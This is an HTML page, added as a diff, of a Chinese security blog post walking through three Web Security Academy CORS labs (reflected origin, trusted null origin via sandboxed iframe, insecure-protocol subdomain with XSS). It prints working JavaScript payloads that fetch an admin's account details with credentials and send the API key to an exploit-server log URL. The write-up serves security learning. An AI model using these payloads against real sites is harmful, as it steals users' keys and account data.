@@ -1,0 +1,530 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>CORS | ZQ-Rookie-Hacker&#39;s Blog</title>
+  <meta name="author" content="ZQ-Rookie-Hacker">
+  
+  <meta name="description" content="0x00.基础知识文章链接：浏览器同源策略与CORS解析
+补充：在下面的靶场中，存在隐藏请求。隐藏请求是前后端数据交互的重点所在
+
+0x01.基于源站反射的 CORS 漏洞该网站存在不安全的 CORS 配置，因为它信任所有源站。要完成本实验，你需要编写一段 JavaScript 代码，利用 CORS 漏洞获取管理员的 API 密钥，并将该代码上传至你的漏洞利用服务器。成功提交管理员的 API 密钥后，实验即告解决。你可以使用以下凭据登录自己的账户：wiener:peter
+
+增加Origin字段
+
+Access-Control-Allow-Origin：允许谁访问
+
+存在两种形式：
+
+
+具体源    只允许这一个源访问，其他都拒绝    如：Access-Control-Allow-Origin: https://web.example.com
+通配符 *    允许任意源访问，但不允许携带凭证    Access-Control-Allow-Origin: *
+
+
+
+
+Access-Control-Allow-Credentials：是否允许携带凭证
+
+允许这个跨域请求携带用户的敏感凭证（如 Cookie、HTTP 认证信息、TLS 客户端证书）。缺失表示不允许携带凭证（默认行为）
+
+
+
+再次修改，可以证明存在CORS漏洞"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="CORS"/>
+  <meta property="og:site_name" content="ZQ-Rookie-Hacker&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/zhuzhuxia.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">ZQ-Rookie-Hacker&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> CORS</h1>
+		</div>
+	
+
+
+
+
+<!-- Reading progress bar -->
+<div class="reading-progress-bar" id="reading-progress-bar"></div>
+
+
+<div class="row post">
+		<!-- cols -->
+		
+		<div id="top_meta"></div>
+		<div class="col-md-9">
+		
+
+		<!-- content -->
+		<div class="mypage">
+		  
+		  <!-- 文章统计 -->
+		  <div class="article-stats">
+		    <i class="fa fa-file-text"></i> 字数: <span id="word-count">计算中...</span>
+		    <span style="margin-left: 12px;"><i class="fa fa-clock-o"></i> 阅读时长: <span id="reading-time">计算中...</span></span>
+		  </div>
+		  
+		  
+
+		  <h3 id="0x00-基础知识"><a href="#0x00-基础知识" class="headerlink" title="0x00.基础知识"></a>0x00.基础知识</h3><p><strong><code>文章链接</code></strong>：<a href="https://zq-rookie-hacker.github.io/2026/04/12/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E4%B8%8ECORS%E8%A7%A3%E6%9E%90/">浏览器同源策略与CORS解析</a></p>
+<p>补充：在下面的靶场中，存在隐藏请求。隐藏请求是前后端数据交互的重点所在<br><img src="/images/CORS/image_1.png" alt="在这里插入图片描述"></p>
+<hr>
+<h3 id="0x01-基于源站反射的-CORS-漏洞"><a href="#0x01-基于源站反射的-CORS-漏洞" class="headerlink" title="0x01.基于源站反射的 CORS 漏洞"></a>0x01.基于源站反射的 CORS 漏洞</h3><p>该网站存在不安全的 CORS 配置，因为它<code>信任所有</code>源站。<br>要完成本实验，你需要编写一段 JavaScript 代码，利用 CORS 漏洞获取管理员的 API 密钥，并将该代码上传至你的漏洞利用服务器。成功提交管理员的 API 密钥后，实验即告解决。<br>你可以使用以下凭据登录自己的账户：wiener:peter</p>
+<p><img src="/images/CORS/image_2.png" alt="在这里插入图片描述"></p>
+<p>增加<code>Origin</code>字段<br><img src="/images/CORS/image_3.png" alt="在这里插入图片描述"></p>
+<ul>
+<li><p><code>Access-Control-Allow-Origin</code>：允许谁访问</p>
+<blockquote>
+<p>存在两种形式：</p>
+<blockquote>
+<ol>
+<li>具体源    只允许这一个源访问，其他都拒绝    如：Access-Control-Allow-Origin: <a target="_blank" rel="noopener" href="https://web.example.com/">https://web.example.com</a></li>
+<li>通配符 *    允许任意源访问，但不允许携带凭证    Access-Control-Allow-Origin: *</li>
+</ol>
+</blockquote>
+</blockquote>
+</li>
+<li><p><code>Access-Control-Allow-Credentials</code>：是否允许携带凭证</p>
+<blockquote>
+<p>允许这个跨域请求携带用户的敏感凭证（如 Cookie、HTTP 认证信息、TLS 客户端证书）。<br>缺失表示不允许携带凭证（默认行为）</p>
+</blockquote>
+</li>
+</ul>
+<p>再次修改，可以证明存在CORS漏洞<br><img src="/images/CORS/image_4.png" alt="在这里插入图片描述"></p>
+<p><strong><code>补充1</code></strong>：如果在第一种情况成立的情况下，而第二种情况不成立，则尝试<br><img src="/images/CORS/image_5.png" alt="在这里插入图片描述"><br><code>myhacker.com</code>是我们掌握的，那就可以注册其与目标网站<code>同名的子域名</code>即可绕过</p>
+<p><strong><code>补充2</code></strong>：测试是否信任其子域名网站<br><img src="/images/CORS/image_6.png" alt="在这里插入图片描述"><br>那也就说，如果我们在其<code>子域名网站</code>找到一个<code>xss,</code>通过这个xss就可以获取这个<code>目标网站的信息</code></p>
+<p><code>攻击流程图</code><br><img src="/images/CORS/image_7.png" alt="在这里插入图片描述"></p>
+<p>注意目标URL是这个：<code>https://0a670073035978ff80189e2600ed00de.web-security-academy.net/accountDetails</code> 数据包中复制</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> req = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    req.<span class="property">onload</span> = reqListener;</span></span><br><span class="line"><span class="language-javascript">    req.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;https://0a670073035978ff80189e2600ed00de.web-security-academy.net/accountDetails&#x27;</span>,<span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">    req.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">    req.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">reqListener</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        data = <span class="variable language_">this</span>.<span class="property">responseText</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(data);  </span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">补充：如果是post方法的话将get改为post即可</span><br><span class="line">然后设置适当的头部 req.setRequestHeader(&#x27;Content-Type&#x27;, &#x27;application/json&#x27;); </span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/CORS/image_8.png" alt="在这里插入图片描述"></p>
+<p>成功获取wiener的信息</p>
+<p><img src="/images/CORS/image_9.png" alt="在这里插入图片描述"><br>如果是SRC，到这里就可以提交漏洞了</p>
+<p><code>req.onload</code>	请求成功完成（无论 HTTP 状态码是什么，只要网络层面成功收到响应）	处理响应数据，执行后续逻辑<br><code>req.onerror</code>请求网络层面失败（如 DNS 解析失败、连接超时）	错误处理<br><code>req.onreadystatechange</code>	请求状态任意变化（readyState 从 0 到 4 都会触发）	精细控制，兼容老代码</p>
+<p>解题的payload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> req = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    req.<span class="property">onload</span> = reqListener;</span></span><br><span class="line"><span class="language-javascript">    req.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;https://0a670073035978ff80189e2600ed00de.web-security-academy.net/accountDetails&#x27;</span>,<span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">    req.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">    req.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">reqListener</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        location=<span class="string">&#x27;/log?key=&#x27;</span>+<span class="built_in">encodeURIComponent</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">实际上就是让admin重定向访问/log?key，并外带出key</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>结果<br><img src="/images/CORS/image_10.png" alt="在这里插入图片描述"></p>
+<p>解码然后提交apikey就行了</p>
+<hr>
+<h3 id="0x02-基于受信任-null-源的-CORS-漏洞"><a href="#0x02-基于受信任-null-源的-CORS-漏洞" class="headerlink" title="0x02.基于受信任 null 源的 CORS 漏洞"></a>0x02.基于受信任 null 源的 CORS 漏洞</h3><p>该网站存在不安全的 CORS 配置，因为它信任 null 源。<br>要完成本实验，你需要编写一段 JavaScript 代码，利用 CORS 漏洞获取管理员的 API 密钥，并将代码上传至你的漏洞利用服务器。成功提交管理员的 API 密钥后，实验即告解决。<br>你可以使用以下凭据登录自己的账户：wiener:peter</p>
+<p>只允许空请求头<br><img src="/images/CORS/image_11.png" alt="在这里插入图片描述"></p>
+<ul>
+<li><p><code>补充知识</code>：浏览器的“源”是如何确定？</p>
+<blockquote>
+<p>一个网页的“源”（Origin）由 协议 + 域名 + 端口 三部分组成，比如 <a href="https://example.com:443。这个源信息会被浏览器自动添加到跨域请求的">https://example.com:443。这个源信息会被浏览器自动添加到跨域请求的</a> Origin 头中。<br>  但有一种特殊情况：当浏览器无法确定一个网页的“真实来源”时，就会使用 null 作为其源</p>
+</blockquote>
+</li>
+<li><p><code> &lt;iframe sandbox&gt;</code> 如何制造 null 源</p>
+<blockquote>
+<p><code>&lt;iframe&gt;</code> 的 sandbox 属性是一个安全机制，它会对嵌入的内容施加额外的限制（比如禁止弹窗、禁止提交表单等）。其中一&gt;个重要的安全设计是：</p>
+<blockquote>
+<p>被 sandbox 属性限制的 iframe 内容，其“源”会被浏览器视为一个“不透明源”（opaque origin），在跨域请求时 Origin 头会被强制设为 null。</p>
+</blockquote>
+<p>这是因为浏览器认为，经过 sandbox 限制的内容已经脱离了原始网站的完全控制，无法再被信任为代表原始网站。因此，浏览器主动将其“匿名化”，用 null 来标识它</p>
+</blockquote>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="left">场景</th>
+<th align="left">嵌入方式</th>
+<th align="left">请求中 <code>Origin</code> 头的值</th>
+<th align="left">服务器响应 <code>ACAO</code></th>
+<th align="left">结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>无 sandbox</strong></td>
+<td align="left"><code>&lt;iframe src=&quot;恶意页面&quot;&gt;</code></td>
+<td align="left"><code>https://exploit-server.com</code></td>
+<td align="left">仅信任 <code>null</code></td>
+<td align="left">❌ 被拦截</td>
+</tr>
+<tr>
+<td align="left"><strong>有 sandbox</strong></td>
+<td align="left"><code>&lt;iframe sandbox srcdoc=&quot;恶意脚本&quot;&gt;</code></td>
+<td align="left"><code>null</code></td>
+<td align="left">信任 <code>null</code></td>
+<td align="left">✅ 绕过限制</td>
+</tr>
+</tbody></table>
+<p>攻击流程图<br><img src="/images/CORS/image_12.png" alt="在这里插入图片描述"></p>
+<p>payload（测试的使用使用alert方便排查，但是ifame禁止弹窗，所以可以使用console.log）</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">sandbox</span>=<span class="string">&quot;allow-scripts allow-top-navigation allow-forms&quot;</span> </span></span><br><span class="line"><span class="tag"> <span class="attr">srcdoc</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">  &lt;script&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">   var req = new XMLHttpRequest();</span></span></span><br><span class="line"><span class="string"><span class="tag">   req.onload = function() &#123;</span></span></span><br><span class="line"><span class="string"><span class="tag">    location = &#x27;https://exploit-0a120090038a7e6680953412014400d1.exploit-server.net/log?key=&#x27; + encodeURIComponent(this.responseText);</span></span></span><br><span class="line"><span class="string"><span class="tag">   &#125;;</span></span></span><br><span class="line"><span class="string"><span class="tag">   req.open(&#x27;get&#x27;, &#x27;https://0ad600cc03067efb80dc35d6008600c9.web-security-academy.net/accountDetails&#x27;, true);</span></span></span><br><span class="line"><span class="string"><span class="tag">   req.withCredentials = true;</span></span></span><br><span class="line"><span class="string"><span class="tag">   req.send();</span></span></span><br><span class="line"><span class="string"><span class="tag">  &lt;/script&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line">srcdoc 是 HTML5 中 <span class="tag">&lt;<span class="name">iframe</span>&gt;</span> 标签的一个属性，用于直接在属性值内编写 HTML 代码，作为 iframe 显示的内容，而不需要通过 src 属性加载外部 URL</span><br><span class="line"></span><br><span class="line">两种方式：</span><br><span class="line"><span class="comment">&lt;!-- 方式一：src 加载外部页面 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;https://example.com/malicious.html&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 方式二：srcdoc 直接嵌入 HTML 代码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&quot;&lt;h1&gt;Hello&lt;/h1&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">sandbox</span>&gt;</span> 使内部内容的源变为 null，绕过服务器的白名单校验</span><br><span class="line">allow-scripts allow-top-navigation	允许 iframe 执行 JavaScript 并跳转页面（用于外带数据）</span><br><span class="line">req.withCredentials = true	强制携带受害者 Cookie，窃取需登录态的数据</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/CORS/image_13.png" alt="在这里插入图片描述"></p>
+<p>解题提交即可</p>
+<hr>
+<h3 id="0x03-基于不信任不安全协议的-CORS-漏洞"><a href="#0x03-基于不信任不安全协议的-CORS-漏洞" class="headerlink" title="0x03.基于不信任不安全协议的 CORS 漏洞"></a>0x03.基于不信任不安全协议的 CORS 漏洞</h3><p>该网站存在不安全的 CORS 配置，因为它信任所有子域名，且不限制访问协议（即无论 HTTP 还是 HTTPS 都一并信任）。<br>要完成本实验，你需要编写一段 JavaScript 代码，利用 CORS 漏洞获取管理员的 API 密钥，并将代码上传至你的漏洞利用服务器。成功提交管理员的 API 密钥后，实验即告解决。<br>你可以使用以下凭据登录自己的账户：wiener:peter</p>
+<ul>
+<li><p><code>漏洞原理</code></p>
+<blockquote>
+<p>该网站存在不安全的 CORS 配置，它信任所有子域名，但不限制访问协议（即无论 HTTP 还是 HTTPS 都一并信任）。<br>  攻击者可以利用子域名上存在的 XSS 漏洞，通过 HTTP 协议注入恶意 JavaScript，从而绕过 CORS 限制，跨域窃取管理员的 API 密钥 (大厂中比较少见)</p>
+</blockquote>
+</li>
+<li><p><code>核心知识点</code></p>
+<blockquote>
+<p>服务器在验证 Origin 时，只检查了子域名是否匹配，却没有限制协议类型。由于 HTTP 是明文传输，攻击者更容易通过中间人攻击等方式操控子域名的响应。在实验中，我们通过子域名上已有的 XSS 漏洞来模拟这种攻击</p>
+</blockquote>
+</li>
+</ul>
+<p><code>https</code> + <code>父域名</code><br><img src="/images/CORS/image_14.png" alt="在这里插入图片描述"></p>
+<p><code>https</code> + <code>子域名</code><br><img src="/images/CORS/image_15.png" alt="在这里插入图片描述"></p>
+<p><code>http</code> + <code>父域名</code><br><img src="/images/CORS/image_16.png" alt="在这里插入图片描述"></p>
+<p><code>http</code> + <code>子域名</code><br><img src="/images/CORS/image_17.png" alt="在这里插入图片描述"></p>
+<p>实际上是这种 <code>http</code> + <code>子域名</code> 组合才可行<br><img src="/images/CORS/image_18.png" alt="在这里插入图片描述"></p>
+<p>翻阅商品帖子<br><img src="/images/CORS/image_19.png" alt="在这里插入图片描述"></p>
+<p>可知，只需要要在本地的商品帖子找出一个xss漏洞就可以了<br><img src="/images/CORS/image_20.png" alt="在这里插入图片描述"></p>
+<p>手工测试或者用插件扫<br><img src="/images/CORS/image_21.png" alt="在这里插入图片描述"></p>
+<p><code>payload</code>，丢到攻击服务器</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&quot;http://stock.0ad2003403e3f48480c6032600320086.web-security-academy.net/?productId=4&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open(&#x27;get&#x27;,&#x27;https://0ad2003403e3f48480c6032600320086.web-security-academy.net/accountDetails&#x27;,true); req.withCredentials = true;req.send();function reqListener() &#123;location=&#x27;https://exploit-0a4800750323f47480d2021b01e0001c.exploit-server.net/log?key=&#x27;%2bthis.responseText; &#125;;%3c/script&gt;&amp;storeId=1&quot;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/CORS/image_22.png" alt="在这里插入图片描述"></p>
+<p>解码提交即可</p>
+<hr>
+
+		  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+
+		  <script>
+		    // 计算字数与阅读时长，同时更新阅读进度条
+		    (function() {
+		      var content = document.querySelector('.mypage');
+		      if (content) {
+		        var text = content.innerText || content.textContent;
+		        // 中文字符（含 CJK 扩展区 + 标点），按字符计数
+		        var chineseChars = (text.match(/[一-鿿㐀-䶿豈-﫿　-〿＀-￯]/g) || []).length;
+		        // 英文/数字按字符计（非词），与 CSDN 统计方式一致
+		        var latinChars = (text.match(/[a-zA-Z0-9]/g) || []).length;
+		        var wordCount = chineseChars + latinChars;
+		        // 阅读时长：中文约 300 字/分钟，英文约 200 词/分钟
+		        var englishWords = (text.match(/[a-zA-Z0-9]+/g) || []).length;
+		        var readingTime = Math.max(1, Math.ceil(chineseChars / 300 + englishWords / 200));
+		        var wcEl = document.getElementById('word-count');
+		        var rtEl = document.getElementById('reading-time');
+		        if (wcEl) wcEl.textContent = '~' + wordCount + ' 字';
+		        if (rtEl) rtEl.textContent = '约 ' + readingTime + ' 分钟';
+		      }
+		      // 阅读进度条
+		      var bar = document.getElementById('reading-progress-bar');
+		      if (bar) {
+		        window.addEventListener('scroll', function() {
+		          var scrollTop = window.pageYOffset || document.documentElement.scrollTop;
+		          var docHeight = document.documentElement.scrollHeight - window.innerHeight;
+		          var progress = docHeight > 0 ? Math.min(100, (scrollTop / docHeight) * 100) : 0;
+		          bar.style.width = progress + '%';
+		        });
+		      }
+		    })();
+		  </script>
+		</div>
+
+		
+		<span id="" class="leancloud-visitors view" data-flag-title="CORS">
+			<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+		</span>
+		
+		
+		<div>
+	  	<center>
+
+		<div class="pagination">
+
+    
+    
+    <a href="/2026/04/15/OAuth_authentication/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2026/04/12/浏览器同源策略与CORS解析/" type="button" class="btn btn-default ">下一页<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+	    </center>
+		</div>
+
+		<!-- comment -->
+		
+			<section id="comments" class="comments">
+				<style>
+				.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+				@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+				</style>
+				<div id="vcomment" class="comment"></div>
+<script>
+// 延迟加载评论系统
+window.addEventListener('load', function() {
+  setTimeout(function() {
+    var script = document.createElement('script');
+    script.src = 'https://unpkg.com/valine@1.5.1/dist/Valine.min.js';
+    script.onload = function() {
+      var valineConfig = {"enable":true,"appId":"22F2XnoONZRtEbXvXO1SDcjS-gzGzoHsz","appKey":"bIFSRG6LeUO90VdfRBHUXNQs","placeholder":"说点什么吧~","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"],"pageView":true}
+      valineConfig.el = '#vcomment';
+      valineConfig.recordIP = true;
+      valineConfig.serverURLs = 'https://22f2xnoo.api.lncldglobal.com';
+      new Valine(valineConfig);
+    };
+    document.head.appendChild(script);
+  }, 1000); // 延迟1秒加载
+});
+</script>
+			</section>
+		
+		
+		
+		</div> <!-- col-md-9/col-md-12 -->
+
+
+		
+		<div id="side_meta">
+			<div class="col-md-3 sticky-meta" id="post_meta"> 
+
+	<!-- small fixed card (date + brief meta) -->
+	<div class="top-card">
+		<!-- date -->
+		
+		<div class="meta-widget">
+		<i class="fa fa-clock-o"></i>
+		2026-04-13
+		</div>
+		
+
+		<!-- brief categories/tags inside fixed card -->
+		
+		<div class="meta-widget small-cats">
+			<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>
+			<ul id="categorys" class="tag_box list-unstyled collapse in">
+				  
+  <li>
+    <li><a href="/categories/网络安全/">网络安全<span>33</span></a></li> <li><a href="/categories/网络安全/漏洞/">漏洞<span>11</span></a></li> <li><a href="/categories/网络安全/漏洞/WEB安全/">WEB安全<span>7</span></a></li> <li><a href="/categories/网络安全/漏洞/WEB安全/Top10/">Top10<span>7</span></a></li>
+  </li>
+
+			</ul>
+		</div>
+		
+
+		
+		<div class="meta-widget small-tags">
+			<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>
+			<ul id="tags" class="tag_box list-unstyled collapse in">
+				  
+  <li><a href="/tags/CORS/">CORS<span>2</span></a></li>
+			</ul>
+		</div>
+		
+	</div>
+
+	<!-- All Categories: sticky within sidebar area -->
+	<div class="category-stick" id="category-stick">
+		
+<div class="widget-wrap">
+  <h3 class="widget-title" style="font-family: monospace; font-size: 1.3em; font-weight: bold; color: #fff;">Categories</h3>
+  <div class="widget category-tree">
+    <ul class="hacker-category-list"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/408/">408</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/408/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a><span class="hacker-category-list-count">7</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/">CTF</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/">BUUCTF</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/PWN/">PWN</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/CTF/BUUCTF/WEB/">WEB</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%9F%A5%E8%AF%86%E6%9D%82%E7%A2%8E/">知识杂碎</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/">Java</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/">python</a><span class="hacker-category-list-count">1</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><span class="hacker-category-list-count">33</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/">SRC&渗透</a><span class="hacker-category-list-count">5</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/">内网</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E6%88%91%E7%9A%84SRC/">我的SRC</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E6%88%91%E7%9A%84SRC/%E6%80%9D%E8%B7%AF/">思路</a><span 